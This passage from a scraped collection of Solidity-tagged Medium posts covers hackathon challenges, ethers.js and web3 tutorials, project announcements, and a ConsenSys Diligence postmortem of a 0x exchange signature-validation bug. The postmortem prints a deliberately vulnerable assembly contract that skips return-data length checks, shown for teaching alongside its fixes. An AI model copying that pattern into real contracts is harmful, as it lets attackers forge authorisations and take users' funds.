Ethereum network. Web3swift allows you to work with test and main Ethereum networks. Here are the key advantages of the library that you should use:Complete functionality on pure Swift without unnecessary dependenciesTruly open-source development supported by the communitySecurity comparable to a hard walletEase of use: you don\u2019t need to be a blockchain expert to work with itweb3swift Challenges :Create a mobile app that uses web3swift library. It can even be a crypto kitties client!#2 Proof of asset protocol \u2014 5000 BKXTest your skills using our new Proof-of-Asset protocol that merges real-world assets with the blockchain technology. Smart contracts on Proof-of-Asset protocol are designed to be scalable on a significant amount of users and can be applied in a wide range of products. Here are some useful resources that you can check out:Proof-of-asset Challenges : Create an application that uses proof-of-asset smart contracts library. It can be anything from the list below or something else you come up with: we only give some ideas for the inspiration:An app that implements asset management by voting. For example, we have a product and a list of suppliers. We use the voting system to decide from whom to order the product.A sample app that tokenizes subscription to some application or service (API).If you are a designer, we will be glad to see different descriptions of the business scenario and infographics for different asset types, for example, a visualization for house construction or water shipment. These infographics must be connected to a smart contract of asset tokenization.#3 Plasma \u2014 5000 BKXThe insufficient scalability of the Ethereum network is one of the most important problems of dapps, since it prevents from using them to their full potential. BANKEX Plasma solves this problem by speeding Ethereum up to 10000 transactions per second. From the technical point of view, Plasma blockchain is just another blockchain that can be efficiently settled to a parent Ethereum chain and is well protected from the misbehavior of both Plasma operator and Plasma blockchain participants by a smart contract on the Ethereum network.Plasma Challenges : The goal is to use plasma in your project. BANKEX appreciates any ideas where using plasma is applicable. That can be an application that faced with ethereum scalability and gas price issues. As a start point have a look at their Plasma ETH exchange repository and deployed demo app. Further, check the API documentation, there you will also find the address of the deployed plasma servers.#4 CTF \u2014 Capture the Flag \u2014 5000BKX:Bonus challenge is for individual hackers, bounty hunters and vulnerability experts. BANKEX is holding a smart contracts security competition. Blockchain development is linked with security audit. So, if you want to be a good developer, you need to understand basic (but not only) vulnerabilities. You can join that competition on their CTF challenge site.Good luck!BANKEX is available at:Website \u2014 Telegram \u2014 Twitter \u2014 Facebook \u2014 Bitcointalk \u2014 Youtube \u2014 LinkedIn \u2014 Reddit \u2014 GitHub \u2014 Steemit", "responses": 0, "tags": ["Blockchain", "Hackathons", "Open Source", "Challenge", "Solidity"]}, {"title": "The SpankChain Product Roadmap", "post_link": "https://medium.com/spankchain/the-spankchain-roadmap-8b41a07d2524?source=search_post", "author_name": "SpankChain", "author_link": "https://medium.com/@SpankChain", "publish_date": "2017-10-12", "last_modified_date": "2018-06-11", "readtime": "1.54", "claps": 280, "voters": 16, "content": "The SpankChain Product RoadmapOur plan to upend the adult entertainment industrySpankChainFollowOct 12, 2017 \u00b7 2 min readLast week we shared our first development update, highlighting our state channel auction technology developed for our upcoming token sale.This week, we are excited to share our current product roadmap, laying out the path we plan to take to liberate the adult entertainment industry from outdated payment processing technology, poor privacy practices, outrageous fees, and rent-seeking middlemen.Below we have mapped out our roll out strategy, visualizing our expected areas of focus on a quarter by quarter basis for the next two years. This map will be presented in further detail in our whitepaper next week and on our website.See the full document hereAs you may have noticed, state channel technology plays a large role in our vision. We believe that payment channels are a necessity for broad adoption of cryptocurrencies throughout the world and that porn is the perfect avenue to bring them to the masses.Throughout history, the adult entertainment industry has been the catalyst for numerous technological advancements. Despite the innovations it has spurred, the industry\u2019s employees are still exposed to draconian working conditions, primarily due to a lack of access to tools that would allow them to safely and securely manage their own business interests. With SpankChain we aim to turn the tables, empowering entertainers with a platform which can handle everything from distribution, to payments, to building an engaged community of followers.We believe in a sex positive future and maintaining the highest standards of privacy and security for sex workers and their clients. Join us on Discord to learn more about how SpankChain will bring these values to the world and how to participate in our upcoming token sale.Connect with SpankChainTo learn more about SpankChain please visit our website, follow us on Twitter, and join our growing Discord community.", "responses": 0, "tags": ["Ethereum Blockchain", "ICO", "Adult Entertainment", "Solidity"]}, {"title": "Build an Ethereum DApp Using Ethers.js", "post_link": "https://medium.com/blockchannel/build-an-ethereum-dapp-using-ethers-js-a1b1930d332?source=search_post", "author_name": "BlockChannel", "author_link": "https://medium.com/@BlockChannel", "publish_date": "2019-03-07", "last_modified_date": "2019-03-07", "readtime": "6.35", "claps": 62, "voters": 16, "content": "Build an Ethereum DApp Using Ethers.jsTutorial from Zastrin.com CEO, Mahesh MurthyBlockChannelFollowMar 7 \u00b7 7 min readNote: This post originally was published on the Zastrin.com blog, by Mahesh MurthyIf you have built dapps on Ethereum, you most likely have used Web3.js to build your javascript frontend. Ethers.js is a lightweight javascript library which can be used as an alternative to Web3.js to build your javascript frontend and interact with the Ethereum blockchain. I had a chance to tinker with Ethers.js recently and was impressed with it. In this post/tutorial, I show how you can use Ethers.js to build a simple dapp. I hope this helps you evaluate and get started using Ethers.js for your next project.In this tutorial, we will create a simple Voting dapp (very similar to our popular \u2018Hello world voting dapp\u2019 many of you might know!). The Solidity contract will be the same but we will use Ethers.js instead of Web3.js for the frontend. The application is extremely simple, all it does is initialize a set of candidates, let anyone vote for those candidates and display the total votes received by each candidate.If you are new to Ethereum, here are some courses that can help you get started.The goal of this tutorial is to:1. Set up the development environment2. Learn the process of writing a contract, compiling it and deploying it in your development environment3. Interact with the contract using ethers.js through a nodejs console4. Interact with the contract using ethers.js in a simple web page to display the vote counts and vote for candidates through the pageIf you have already worked through the \u2018Hello world voting dapp\u2019, you can skip to Step 3.This is how I would visualize this application we are going to build.1. Setting up the development environmentInstead of developing the app against the live blockchain, we will use an in- memory blockchain (think of it as a blockchain simulator) called ganache. Below are the steps to install ganache, ethersjs, solc (to compile our contract) and start the test blockchain on a macos. The exact same instructions work on linux as well.zastrin@macbook$ brew updatezastrin@macbook$ brew install nodejszastrin@macbook$ mkdir -p ethereum_voting_dapp/chapter1-ethersjszastrin@macbook$ cd ethereum_voting_dapp/chapter1-ethersjszastrin@macbook$ npm install ganache-cli ethers solc@0.5.3zastrin@macbook$ node_modules/.bin/ganache-cliGanache CLI v6.0.3 (ganache-core: 2.0.2)Available Accounts==================(0) 0x5c252a0c0475f9711b56ab160a1999729eccce97(1) 0x353d310bed379b2d1df3b727645e200997016ba3(2) 0xa3ddc09b5e49d654a43e161cae3f865261cabd23(3) 0xa8a188c6d97ec8cf905cc1dd1cd318e887249ec5(4) 0xc0aa5f8b79db71335dacc7cd116f357d7ecd2798(5) 0xda695959ff85f0581ca924e549567390a0034058(6) 0xd4ee63452555a87048dcfe2a039208d113323790(7) 0xc60c8a7b752d38e35e0359e25a2e0f6692b10d14(8) 0xba7ec95286334e8634e89760fab8d2ec1226bf42(9) 0x208e02303fe29be3698732e92ca32b88d80a2d36Private Keys==================(0) a6de9563d3db157ed9926a993559dc177be74a23fd88ff5776ff0505d21fed2b(1) 17f71d31360fbafbc90cad906723430e9694daed3c24e1e9e186b4e3ccf4d603(2) ad2b90ce116945c11eaf081f60976d5d1d52f721e659887fcebce5c81ee6ce99(3) 68e2288df55cbc3a13a2953508c8e0457e1e71cd8ae62f0c78c3a5c929f35430(4) 9753b05bd606e2ffc65a190420524f2efc8b16edb8489e734a607f589f0b67a8(5) 6e8e8c468cf75fd4de0406a1a32819036b9fa64163e8be5bb6f7914ac71251cc(6) c287c82e2040d271b9a4e071190715d40c0b861eb248d5a671874f3ca6d978a9(7) cec41ef9ccf6cb3007c759bf3fce8ca485239af1092065aa52b703fd04803c9d(8) c890580206f0bbea67542246d09ab4bef7eeaa22c3448dcb7253ac2414a5362a(9) eb8841a5ae34ff3f4248586e73fcb274a7f5dd2dc07b352d2c4b71132b3c73fHD Wallet==================Mnemonic: cancel better shock lady capable main crunch alcohol derive alarm duck umbrellaBase HD Path: m/44'/60'/0'/0/{account_index}Listening on localhost:8545Notice that the ganache-cli creates 10 test accounts to play with automatically. These accounts come preloaded with 100 (fake) ethers.2. Simple voting contractWe are going to use the solidity programming language to write our contract. If you are familiar with object oriented programming, learning to write solidity contracts should be a breeze. We will write a contract (think of contract as a class in your favorite OOP language) called Voting with a constructor which initializes an array of candidates. We will write 2 methods, one to return the total votes a candidate has received and another method to increment vote count for a candidate.Note: The constructor is invoked once and only once when you deploy the contract to the blockchain. Unlike in the web world where every deploy of your code overwrites the old code, deployed code in the blockchain is immutable. i.e, If you update your contract and deploy again, the old contract will still be in the blockchain untouched along with all the data stored in it, the new deployment will create a new instance of the contract.Below is the voting contract code with inline comment explanation:Copy the above code to a file named Voting.sol in the ethereum_voting_dapp/chapter1-ethersjs directory. Now let\u2019s compile the code and deploy it to ganache blockchain. Follow the commands below to compile the contract.zastrin@macbook$ node_modules/.bin/solcjs \u2014 bin \u2014 abi Voting.solzastrin@macbook$ lsVoting.sol Voting_sol_Voting.abi Voting_sol_Voting.binWhen you compile the code successfully using the command above, the compiler outputs 2 files that are important to understand:1. Voting_sol_Voting.bin: This is the bytecode you get when the source code in Voting.sol is compiled. This is the code which will be deployed to the blockchain.2. Voting_sol_Voting.abi: This is an interface or template of the contract (called abi) which tells the contract user what methods are available in the contract. Whenever you have to interact with the contract in the future, you will need this abi definition. You can read more details about ABI hereWe will now use ethersjs library to deploy our application and interact with it.First, run the \u2018node\u2019 command in your terminal to get in to the node console and initialize the ethers object. All the code snippets below need to be typed in the node console. To compile the contract, load the bytecode and abi from the file system in to a string like shown belowzastrin@macbook$ node> ethers = require(\u2018ethers\u2019)> bytecode = fs.readFileSync(\u2018Voting_sol_Voting.bin\u2019).toString()> abi = JSON.parse(fs.readFileSync(\u2018Voting_sol_Voting.abi\u2019).toString())Next is to initialize the provider which is a generic interface to connect to the blockchain. Since we are running the blockchain locally, we will use the JsonRPCProvider to connect to it. If you wanted to connect to a real blockchain, you have many other provider options. Once connected, you can test the connection by querying ganache and listing all the accounts. Running the below commands in your nodejs console should list 10 accounts.> provider = new ethers.providers.JsonRpcProvider()> provider.listAccounts().then(result => console.log(result))The next step is to initialize the signer which is used to sign the transactions. We can select which account we want to use (we have 10 accounts ganache in setup) by passing the index to getSigner as shown below. Once the wallet is intialized, create a contract factory and deploy the contract as shown. The deploy function takes an array of arguments that is passed to the constructor of the contract. In our case, we pass in the names of the candidates. We have to explicitly convert string to bytes32 because our contract takes bytes32 as argument.> signer = provider.getSigner(0)> factory = new ethers.ContractFactory(abi, bytecode, signer)> contract = null> factory.deploy([ethers.utils.formatBytes32String(\u2018Rama\u2019), ethers.utils.formatBytes32String(\u2018Nick\u2019), ethers.utils.formatBytes32String(\u2018Jose\u2019)]).then(\u00a9 => { contract = c})If you successfully deployed the contract, your contract object should have all the details of the deployed contract. There are hundreds of thousands of contracts deployed on the blockchain. So, how do you identify your contract in that blockchain? Answer: contract.address. When you have to interact with your contract, you need this deployed address and abi definition we talked about earlier.3. Interact with the contract in the nodejs console> contract.totalVotesFor(ethers.utils.formatBytes32String(\u2018Rama\u2019)).then((f) => console.log(f.toNumber()))> contract.voteForCandidate(ethers.utils.formatBytes32String(\u2018Rama\u2019)).then((f) => console.log(f))> contract.totalVotesFor(ethers.utils.formatBytes32String(\u2018Rama\u2019)).then((f) => console.log(f.toNumber()))Try the above commands in your node console and you should see the vote count increment. Every time you vote for a candidate, you get back a transaction id: Example: \u20180xdedc7ae544c3dde74ab5a0b07422c5a51b5240603d31074f5b75c0ebc786bf53\u2019 above). This transaction id is the proof that this transaction occurred and you can refer back to this at any time in the future. This transaction is immutable. This immutability is one of the big advantages of blockchains such as Ethereum.4. Webpage to connect to the blockchain and voteNow that most of the work is done, all we have to do now is create a simple html file with candidate names and invoke the voting commands (which we already tried and tested in the nodejs console) in a js file. Below you can find the html code and the js file. Drop both of them in the ethereum_voting_dapp/chapter1-ethersjs directory and open the index.html in your browser.You should now see the vote counts and you should also be able to vote for candidates.If you are using a wallet like Metamask, you will need to use a Web3 provider instead of JsonRPCProvider we used earlier. To do that, simply change the provider in your index.js to:provider = new ethers.providers.Web3Provider(web3.currentProvider);If you want to interact through Metamask, you can\u2019t just open index.html and interact in your browser anymore. You have to server the file through a server. So, install a simple webserver and start like belowzastrin@macbook$ npm install http-serverzastrin@macbook$ http-serverYou can now go to localhost:8080 and interact with your application. Below is a quick demo which includes loading test ether account into metamask.I hope you were able to follow along and get the application working. Check out Zastrin.com, and sign-up to get more tutorials and lessons so you can build and deploy real working dApps.Start contributing to the community and decentralization, and become a Zastrin developer. If you run into issues getting the application working, feel free to DM me on twitter @zastrinlab or email mahesh@zastrin.com.", "responses": 1, "tags": ["Ethereum", "Development", "Solidity", "Etherjs", "Dapps"]}, {"title": "Solidified to Become the Official Audit Partner of Polymath", "post_link": "https://blog.polymath.network/solidified-to-become-the-official-audit-partner-of-polymath-4b7f92164bba?source=search_post", "author_name": "Polymath", "author_link": "https://blog.polymath.network/@polymathnetwork", "publish_date": "2018-10-18", "last_modified_date": "2019-02-22", "readtime": "2.01", "claps": 258, "voters": 15, "content": "Solidified to Become the Official Audit Partner of PolymathPolymathFollowOct 18, 2018 \u00b7 3 min readOctober 18, 2018 \u2014 Toronto & Solidified HQ \u2014 Polymath and Solidified are pleased to announce a partnership that will see Solidified as Polymath\u2019s Official Audit Partner. The two have been working closely together, and will continue working closely together, to ensure the security of Polymath\u2019s smart contracts and on-chain protocol.\u201cWe are honored and excited to be selected as Polymath\u2019s official auditor,\u201d said Eduard Kotysh, Founder and CEO of Solidified. \u201cThe technical team at Polymath truly understands the importance and multi-tiered nature of blockchain security and always seeks to use the best methods to protect their smart contracts. As one of our earliest clients, we\u2019re proud to see how much Polymath has grown, how accurately they have predicted the move to security tokens and become the leader in this space. We are looking forward to a long-term relationship and providing the best in class protection for the Polymath platform.\u201dSolidified Team\u201cSecurity is a critical concern of any organisation building an on-chain protocol,\u201d said Adam Dossa, Director of Technology at Polymath. \u201cWhen combined with securities and mechanisms that hold and transfer digital assets this concern becomes paramount. At Polymath we\u2019ve always taken a multi-faceted approach to this challenge, including commissioning multiple external audits for our Solidity code, running public and private bug bounties, and a strict, enforced, review process internally on code changes. We are truly excited to be building a long term relationship with Solidified which provides a comprehensive auditing process, leveraging their large community of thought leaders and domain experts, as well as an innovative bug bounty process.\u201dPolymath TeamJoin a Polymath Webinar to learn how you can create your own (audited and secure \u2014 thanks Solidified!) security token: https://polymath.network/webinar.htmlWebsite: https://polymath.networkReddit: https://reddit.com/r/polymathnetworkTwitter: https://twitter.com/polymathnetworkTelegram Group: https://t.me/polymathnetworkTelegram Announcements Channel: https://t.me/polymathnetworkFacebook: https://facebook.com/polymathnetworkPolymath GitHub: https://www.github.com/polymathnetworkPolymath Gitter: https://gitter.im/PolymathNetwork/Joining PolymathDo you want to join the security token revolution? We are growing rapidly and always looking for high quality talent. Check out our careers page athttps://polymath.bamboohr.com/jobs/ to apply!About PolymathPolymath Network (Polymath) is a decentralized platform that makes it easy to create security tokens. The platform simplifies the complex technical challenges of creating a security token and aims to bring the multi-trillion dollar financial securities market to the blockchain.", "responses": 0, "tags": ["Ethereum", "Announcements", "Solidity", "Cryptocurrency", "Blockchain"]}, {"title": "Waffle 2.0 released", "post_link": "https://medium.com/ethworks/waffle-2-0-released-93b9db6e67ea?source=search_post", "author_name": "Marek Kirejczyk", "author_link": "https://medium.com/@marekkirejczyk", "publish_date": "2019-01-23", "last_modified_date": "2019-01-24", "readtime": "1.98", "claps": 429, "voters": 16, "content": "Waffle 2.0 releasedMarek KirejczykFollowJan 23 \u00b7 2 min readAfter weeks of hard work, I am glad to announce the release of Waffle version 2.0, with a dozen new functionalities.What\u2019s new?Documentation and websiteWaffle now has detailed documentation and a new website.Faster compilation with native and dockerized solcBy default, Waffle uses solcjs as it\u2019s solidity compiler. This is convenient, because solcjs can be easily installed with the same tools as Waffle. On the other hand it tends to be slow for bigger projects.With Waffle 2.0 you can now use blazing quick native and dockerized solc. If you don\u2019t mind a couple of additional setup steps. Stay tuned for some Benchmarks.A screen from a new websiteNew chai matchers: changeBalance The new changeBalance and changeBalances matchers allow checking if a balance of an account(s) changed, example below:Read more about new matchers in the documentation.Support for TypeScriptThe code is now rewritten in TypeScript with near complete support for developing with TypeScript. Notable exceptions are the chai matchers, which we plan to include in version 2.1.FixturesWhen extensively testing code dependent on smart contracts it is often useful to have a specific scenario play out before each test. That leads to repetition and slow code execution. With fixtures, you can clean-up your code and speed it up by a order of magnitude. Here comes an example fixtures declaration:And here how to use it:Read more about fixtures in the documentation.Others:Waffle now supports config files with both json and js extensions.Contract linking should work for both solidity 4 and solidity 5The compilation is covered with extensive end-to-end testsWaffle is now officially released under MIT licenseBreaking changes:getWallet() function is not async anymoreNode versions older than 10 are not longer supportedA new format for compilation output files has been introducedAcknowledgments:Waffle 2.0 was possible thanks to a group of wonderful contributors, in particular, I would like to thank:sz-piotr for implementing fixtures and migrating to TypeScriptvanruch for implementing change balance checkers (and revertedWith in previous version)rzadp for implementing linking of smart contractsspherefoundry and JustynaBroniszewska for their helpAnd last, but not least special thanks go to snario for day to day testing, reporting and helping in fixing multiple issues along the way.Get updatesIf you would like to get updates on Waffle \u2b50\ufe0f and follow us Waffle GitHub.EthworksIf would like to get updates on what we do \u2014 follow us on Medium and if you like the story \ud83d\udc4f \ud83d\udc4f \ud83d\udc4f.", "responses": 0, "tags": ["JavaScript", "Solidity", "Waffle", "Truffle"]}, {"title": "Developing with Polymath: Using web3 (Part 1)", "post_link": "https://blog.polymath.network/developing-with-polymath-using-web3-part-1-d24c5f5624f7?source=search_post", "author_name": "Shannon Clarke", "author_link": "https://blog.polymath.network/@sajclarke", "publish_date": "2018-10-04", "last_modified_date": "2018-10-30", "readtime": "2.97", "claps": 201, "voters": 15, "content": "Developing with Polymath: Using web3 (Part 1)Shannon ClarkeFollowOct 4, 2018 \u00b7 3 min readIn this two-part tutorial, we\u2019re going to connect to Polymath contracts (v1.3 on Kovan) using web3.js and create-react-app in order to register a Ticker symbol.Since registering a Ticker requires 250 POLY, let\u2019s start by showing you how to request POLY from the PolyToken contract. In the next tutorial (Part 2), we will cover the registration of a Ticker as well as viewing your previously registered Ticker symbols. If you only want to view the code, click here for the github repo.Note: Before you get started, please make sure that you have Metamask installed and unlocked on your preferred browser. You may also need to grab some Kovan TestNet ETH. You can follow instructions to get Kovan TestNet ETH here: https://faucet.kovan.networkGetting started with React and web3We can quickly scaffold by executing the following commands where project-name is whatever you\u2019d like to name your project folder:npm i -g create-react-app create-react-app {project-name}cd {project-name}Now let\u2019s install web3 which is a \u201ccollection of libraries which allow you to interact with a local or remote Ethereum node, using a HTTP or IPC connection\u201d. Essentially, it provides a Javascript API for us to access the smart contract through a web interface. We\u2019ll be using web3 1.0.x for this tutorial.We\u2019ll also install reactstrap to assist with displaying and improving the user-interfacenpm i web3 --savenpm i bootstrap --savenpm i reactstrap --saveNote: In order to use bootstrap, you need to add the following import to yourindex.js file: `import 'bootstrap/dist/css/bootstrap.min.css';Edit your src/App.js to import web3 and within componentDidMount() you can access web3 as follows:Note: Make sure that you have Metamask installed and unlocked.Now if you executeyarn start from the command line then you will see your selected Metamask account\u2019s Eth Address. You can also clone the \u201cstep1\u201d branch of this repo.Connecting to Smart ContractsWe will connect to the TestNet (Kovan) deployment of the PolyToken contract which we can find by checking etherscan for its deployed address here: 0xB06d72a24df50D4E2cAC133B320c5E7DE3ef94cB. Go to the \u201cCode\u201d tab and copy the \u201cContract ABI\u201d. This interface is in a JSON-format and provides us with access to the smart contract\u2019s functions.Note: The PolyToken contract can be accessed via the TickerRegistry contract but we\u2019ll cover that in the next article.Now, within the src folder of your app, let\u2019s do the following:mkdir contracts && cd contractstouch PolyTokenFaucet.jsonEdit the PolyTokenFaucet.json to the following:{  \"contractName\": \"PolyTokenFaucet\",  \"abi\": /** Paste the full ABI here **/}Let\u2019s go back to src/App.js and import the PolyTokenFaucet contract as well as connect to it and check our POLY balance. Update src/App.js as follows:Now you have your POLY balance displayed within the app. You can confirm this balance by adding the PolyToken to your Metamask account under accounts. You can do so by clicking \u201cAdd Token\u201d under your Metamask account (in \u201cTokens\u201d section).If you don\u2019t have any POLY at the moment, let\u2019s call the getTokens() function from the PolyToken contract. The getTokens() function accepts two parameters:_amount (uint256) \u2014 the amount of POLY to be sent_recipient (String) \u2014 the ETH address which will receive the POLYUpdate your src/App.js to include a form so that you can set how much POLY you\u2019d like to grab.Run yarn start again and you should successfully be able to grab TestNet POLY after updating the request POLY field and confirming the Metamask transaction. In part 2 of this tutorial, we\u2019ll refactor this code to include the TickerRegistry smart contract so that we can register our own Ticker symbol!Are you looking for the full code? Check out this github repo!We are rewarding developers who build modules for the Polymath ecosystem with bounties! We look forward to seeing your PRs on Github and \u201cRequests to work\u201d on Gitcoin!Do you have questions about developing with Polymath? Please ask questions on our Gitter and use our Developer Portal as a reference.Join the stampede and help build the future of finance!Keeping up with Polymath:Follow us!Github: https://github.com/PolymathNetworkGitter: https://gitter.im/PolymathNetwork/LobbyReddit: https://www.reddit.com/r/PolymathNetwork/Twitter: https://twitter.com/polymathnetworkTelegram: https://t.me/polymathnewsFacebook: https://www.facebook.com/polymathnetwork/Youtube: https://www.youtube.com/c/polymathnetworkJoin the Polymath Team!Are you interested in joining the security token revolution? We are always looking for high quality talent. Check out our careers page at https://polymath.bamboohr.com/jobs/ to apply!", "responses": 0, "tags": ["Ethereum", "Tech Blog", "Solidity", "Open Source", "Blockchain"]}, {"title": "Return Data Length Validation: a Bug We Missed", "post_link": "https://medium.com/consensys-diligence/return-data-length-validation-a-bug-we-missed-4b7bbea8e9ab?source=search_post", "author_name": "Steve Marx", "author_link": "https://medium.com/@smarx", "publish_date": "2019-07-15", "last_modified_date": "2019-07-19", "readtime": "8.95", "claps": 293, "voters": 16, "content": "Return Data Length Validation: a Bug We MissedSteve MarxFollowJul 15 \u00b7 9 min readPhoto by patricia serna on UnsplashA rather serious vulnerability was recently found in the 0x v2.0 Exchange, a smart contract system that our team audited. The bug went undiscovered for about a year and (thankfully) appears to never have been exploited. Kudos to samczsun, the security researcher who discovered the bug and reported it to 0x.We know from our experience with them that the 0x team is highly competent and takes security extremely seriously. We\u2019ve worked with 0x on a number of audits, including the one that covered this code, so our whole team was saddened to hear about this bug. You can find our audit report here, where we found a couple critical bugs but not this one: https://github.com/ConsenSys/0x_audit_report_2018-07-23.When something goes wrong, it can be useful to conduct a postmortem, an after-the-fact analysis of what went wrong. The goal of a healthy postmortem is to identifying ways to improve.In this blog post, I\u2019d like to share some of what we learned from our postmortem on this particular bug. I\u2019ll explain the technical details of the vulnerability, demonstrate how smart contract developers can protect themselves from this class of bug, and share some lessons learned.Validating Return Data LengthThe BugI\u2019ve distilled the vulnerable code down to a simple function. In the below code, assume that the IFetcher contract is supplied by a user. See if you can spot the bug:pragma solidity 0.5.10;interface IFetcher {    function fetch() external view returns (uint256);}contract Vulnerable {    function getNumber(IFetcher f) external view returns (uint256) {        bytes32 selector = f.fetch.selector;                uint256 ret;        bool success;                assembly {            let ptr := mload(0x40)     // get free memory pointer            mstore(0x40, add(ptr, 32)) // allocate 32 bytes            mstore(ptr, selector)      // write the selector there            success := staticcall(                gas,                   // forward all gas                f,                     // target                ptr,                   // start of call data                4,                     // call data length                ptr,                   // where to write return data                32                     // length of return data            )            ret := mload(ptr)          // copy return data into ret        }                require(success, \"Call failed.\");                return ret;    }}Under normal circumstances (a conformant IFetcher implementation), this code works fine, but something surprising happens if you pass in an externally owned account (EOA). An EOA address has no associated code, and this means all calls to it succeed and return nothing. The low-level STATICCALL opcode used here will return success but will only copy as much data into memory as was returned. So even though we asked for 32 bytes of return data, nothing gets copied to memory because there is no data to copy.Because nothing gets copied, memory is just as it was before the call. That means ptr is still pointing to the selector data, so this function returns 0xa95c372d000000\u2026 (the function selector for fetch()).The same thing happens if you call a contract that implements fetch() without a return value or just implements a fallback function. The bug occurs any time the call succeeds but doesn\u2019t return as much data as the caller expects.Why This Matters In the 0x ExchangeThis bug manifested itself in the 0x v2.0 Exchange in a particularly nasty way due to where the bug was. The exchange allows trades to be constructed off chain and then validated and filled on chain. To know that a trade is authorized, the exchange must validate a trader\u2019s signature.One option the exchange offers for validating a trader\u2019s signature is to delegate that checking to a contract. Essentially, the trader can be a smart wallet that implements a function with the signature isValidSignature(bytes32,bytes) and returns a boolean true if the signature is valid.As you have no doubt anticipated, the problem is that isValidSignature is called via code that\u2019s very similar to the above vulnerable contract. If the target is not a smart contract (or otherwise returns no data), the data already in memory stays unchanged. Any non-zero value there is interpreted as true and authorizes the trade.Even this would be okay if traders had to specifically opt in to this type of signature scheme, but remember that these trades are constructed off chain to avoid the expense and delay of making an on chain transaction. So the person taking the proposed trade is able to dictate which type of signature checking should happen via a flag.All an attacker needs to do is trade with an externally owned account and specify that the signature should be checked by calling isValidSignature. This validation will succeed because no data is returned and the data already present in memory is non-zero.How It Was IntroducedThis bug was introduced in a fix to a critical reentrancy issue identified in the initial phase of our audit. The recently introduced STATICCALL opcode was an ideal solution, but it wasn\u2019t yet used by the current version of Solidity (0.4.22).The 0x team considered two options that would allow them to use STATICCALL. The first was to add pragma experimental \u201cv0.5.0\u201d; to the file. The downside here was that many other new compiler features would be activated.The second option was to use Solidity assembly, which gave access to the new opcode even in Solidity 0.4.22. The team opted for the latter approach, which required reimplementing the functionality (and protections) provided by Solidity\u2019s higher level function call syntax.We reviewed their code but did not identify the issue in their implementation. A good method for reviewing this type of code in the future would be to compare it to the compiler output of analogous high-level Solidity code.The FixThere are a few ways to fix this class of vulnerability. The 0x team took a sensible defense-in-depth approach in their patch.If you don\u2019t need to write hand-optimized assembly, by far the best approach is to take advantage of Solidity\u2019s high-level syntax for making contract calls:contract SafeSolidity {    function getNumber(IFetcher f) external view returns (uint256) {        return f.fetch();    }}Since Solidity 0.4.22, the compiler emits byte code that explicitly checks the size of the return data and reverts if not enough data is returned. If you pass in an EOA to the SafeSolidity contract, the call will revert.If you do need to write assembly, a good fix is to write your own check for the return data size and revert if it\u2019s wrong:success := staticcall(...)if lt(returndatasize, 32) {    revert(0, 0)}The 0x team implemented that fix but went beyond this in two ways:Before even making the call, the new code uses extcodesize to check if the target address is a smart contract. If it isn\u2019t, the transaction is immediately reverted.Instead of just checking for a boolean true, the new code requires a specific return value (a \u201cmagic salt\u201d value). Anything else is treated as failure.That second improvement also helps in the case that a contract implements isValidSignature(bytes32,bytes) for some other reason (e.g. to work with another contract that uses the same type of signature validation scheme). The contract author may not have intended to have their function used to validate 0x exchange signatures, and this improvement means they won\u2019t accidentally be used that way.Lessons LearnedAside from the technical lesson about a gotcha of the Ethereum Virtual Machine (EVM), there are some other lessons our team has taken from this experience. Some of these lessons may be relevant to others in the Ethereum community, so I\u2019d like to share those here.Audited Code Can Still Have BugsPerhaps the most important lesson is that an audit isn\u2019t a guarantee. All code is at risk of having bugs. A security audit can help to assess that risk and to find some of the worst bugs early, but it can\u2019t promise to identify all bugs. Even formal verification, which provides stricter proofs around correctness, can only find bugs to the extent that the code is formally specified. A bug like this one can easily slip through such a process.Have a Contingency PlanWhen a bug is discovered after deployment, it\u2019s important to have a plan for how to respond. Sometimes, it\u2019s simply too late by the time you learn about the bug because it\u2019s already been exploited in an irreparable way. But for cases where a security researcher discloses a bug privately or the bug has limited reach, you\u2019ll want to know what to do.In \u201cUpgradeability Is a Bug\u201d, I argued against the unrestricted ability to change contract code after deployment, but that doesn\u2019t mean you can\u2019t plan other mechanisms for fixing bugs. 0x has several safe upgrade mechanisms for various parts of the system, but in this case they opted for what is often the simplest and best plan. They redeployed the whole system and had users use the new contracts instead.Having contingency plans is important, but you also need to make sure your processes are well documented. This includes things like how to rotate keys, how to redeploy the system, who can unlock a multisig wallet, how to update your DApp to use a new contract, etc. When something happens, you\u2019ll want to be able to act quickly and confidently.Testing Isn\u2019t the AnswerIn retrospect, it seems like there\u2019s a simple test that would have caught this issue: just try validating a signature with an externally owned account. This is often true in retrospect, but it\u2019s another matter to come up with all the important test cases before knowing exactly where a bug will be found.In particular, please note that you can easily have 100% code coverage of this vulnerable code without catching the bug.Inline Assembly Is RiskyAlthough we didn\u2019t call it out in this audit report (because the 0x team was well aware already), we tend to warn clients that inline assembly is riskier than sticking to Solidity.Assembly code is harder to read/audit, and it\u2019s also just harder to get right. As gotchas like this one are discovered, Solidity gets smarter about the code it emits. Individual developers and auditors have to instead just try to remember everything.Sharing and Encoding KnowledgeIt\u2019s impossible for everyone to know about every gotcha, every technique, and every vulnerability. One aspect I really enjoy about working within the security community is that everyone seems committed to sharing their knowledge and expertise.ConsenSys Diligence in particular aspires to the lofty mission of \u201ccreating a safe, trustworthy and healthy Ethereum ecosystem\u201d. That obviously won\u2019t be achieved by just auditing code and developing our in-house expertise.Sharing knowledge like we\u2019re doing here is a great way to contribute, but we should all recognize that not everyone can know everything. For each piece of knowledge and expertise, our team likes to think about the following ways we can avoid just \u201ceveryone has to know this\u201d. This list is in order of preference:Can we make the problem go away altogether? For example, uninitialized storage pointers used to be a common cause of vulnerabilities in Solidity code, but since Solidity 0.5.0, such vulnerable code simply won\u2019t compile. Now this is one less thing developers and auditors need to know about.Can we address the problem with tools? Analysis tools in the Ethereum space have come a long way quite quickly. Our own team has MythX, a service for running a variety of analysis tools. When new classes of bugs appear, we can build knowledge of them into the tools. Reentrancy vulnerabilities are an example of an anti-pattern that tools can identify quite effectively.Can we address the problem with checklists? Checklists are a well-known way of sharing knowledge and preventing mistakes. Every audit our team does starts with a list of \u201cTODO\u201d issues in GitHub that remind us of things to look for in the code we\u2019re auditing. After each audit, we perform a retrospective and look for things to add or remove from that list. To make sure the TODOs stay relevant, we plan to make more specific TODO lists for different types of code. This particular vulnerability, for example, might go in a list of things to look for in inline assembly. (This is, of course, only if the issue can\u2019t be adequately addressed with tooling.)Can we document the problem? If nothing else, we can document and organize issues so others have an easier time learning about them. Our team maintains the Ethereum Smart Contract Security Best Practices and Smart Contract Weakness Classification Registry for this reason, but there\u2019s never enough time in the day to document everything we\u2019d like to. Contributions are welcome to both, so please share your expertise!SummaryThis particular bug has to do with a gotcha around the CALL and STATICCALL EVM opcodes. When using these low-level 